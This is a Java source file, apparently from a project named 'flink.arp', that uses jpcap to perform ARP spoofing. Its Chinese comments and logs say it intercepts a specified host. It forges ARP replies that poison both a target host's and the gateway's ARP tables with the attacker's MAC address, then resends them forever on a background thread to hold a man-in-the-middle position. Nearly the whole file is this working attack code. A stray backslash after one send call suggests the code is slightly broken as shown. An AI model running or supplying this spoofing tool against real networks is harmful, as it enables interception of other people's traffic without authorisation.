package com.vigos.flink.arp;

import jpcap.JpcapSender;
import jpcap.NetworkInterface;
import jpcap.packet.ARPPacket;
import jpcap.packet.EthernetPacket;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.net.InetAddress;

/**
 * Created by duke on 2016/11/15.
 * arp-client
 * 对指定主机的拦截
 */
public class Arp {

    private static Logger logger = LoggerFactory.getLogger(Arp.class);

    private JpcapSender sender;
    private NetworkInterface device;

    public Arp(JpcapSender sender, NetworkInterface device) {
        this.sender = sender;
        this.device = device;
    }

    void sendArp(InetAddress destIp, byte[] destMac, InetAddress gateIp, byte[] gateMac, int time) throws Exception {
        // DEST设置ARP包
        ARPPacket arp = new ARPPacket();
        arp.hardtype = ARPPacket.HARDTYPE_ETHER;
        arp.prototype = ARPPacket.PROTOTYPE_IP;
        arp.operation = ARPPacket.ARP_REPLY;
        arp.hlen = 6;
        arp.plen = 4;
        arp.sender_hardaddr = device.mac_address;
        arp.sender_protoaddr = gateIp.getAddress();
        arp.target_hardaddr = destMac;
        arp.target_protoaddr = destIp.getAddress();
        EthernetPacket ether = new EthernetPacket();
        ether.frametype = EthernetPacket.ETHERTYPE_ARP;
        ether.src_mac = device.mac_address;
        ether.dst_mac = destMac;
        arp.datalink = ether;
        //GATE arp
        ARPPacket arpGate = new ARPPacket(); //修改网关ARP表的包
        arpGate.hardtype = ARPPacket.HARDTYPE_ETHER; //跟以上相似，不再重复注析
        arpGate.prototype = ARPPacket.PROTOTYPE_IP;
        arpGate.operation = ARPPacket.ARP_REPLY;
        arpGate.hlen = 6;
        arpGate.plen = 4;
        arpGate.sender_hardaddr = device.mac_address;
        arpGate.sender_protoaddr = destIp.getAddress();
        arpGate.target_hardaddr = gateMac;
        arpGate.target_protoaddr = gateIp.getAddress();
        EthernetPacket ethToGate = new EthernetPacket();
        ethToGate.frametype = EthernetPacket.ETHERTYPE_ARP;
        ethToGate.src_mac = device.mac_address;
        ethToGate.dst_mac = gateMac;
        arpGate.datalink = ethToGate;

        Thread thread = new Thread(() -> {
            // 发送ARP应答包
            while (true) {
                logger.info("进行arp欺诈  >>>>>  欺诈目标:{},数据包转发目标:{}", destIp.getHostAddress(), device.addresses[1].address.getHostAddress());
                sender.sendPacket(arp);\
                //netsh i i show in
                //netsh -c "i i" add neighbors 11 "192.168.100.13" "f8-2d-7c-cf-f4-d2"
                logger.info("进行arp欺诈  >>>>>  欺诈目标:{},数据包转发目标:{}", gateIp.getHostAddress(), device.addresses[1].address.getHostAddress());
                sender.sendPacket(arpGate);
                try {
                    Thread.sleep(time * 1000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        thread.setDaemon(true);
        thread.start();
    }
}
